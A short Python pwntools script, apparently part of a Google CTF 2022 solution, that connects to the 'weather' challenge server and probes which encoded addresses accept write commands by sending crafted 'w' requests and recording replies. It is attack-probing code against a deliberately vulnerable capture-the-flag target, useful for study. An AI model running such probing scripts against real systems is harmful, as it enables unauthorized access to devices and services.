from pwn import *
io = remote("weather.2022.ctfcompetition.com", 1337)
print(io.recvline())
print(io.recvline())

def build(ps, target):
    for p in ps:
        for ch in "0123456789":
            if int(p + ch) % 256 == target:
                return p + ch
            else:
                ps.append(p + ch)
        ps.pop(0)
    return build(ps, target)

try:
    valid = []
    for i in range(128, -1, -1):
        addr = build(["111"], i).encode()
        payload = b' ' + addr + b' 128'
        io.sendline(b'w ' + addr + b' 1 1')
        r = io.recvline()
        if b'ready' in r:
            valid.append(i)
        print("%d\t%s\t%s" % (i, addr, r))
finally:
    print(valid)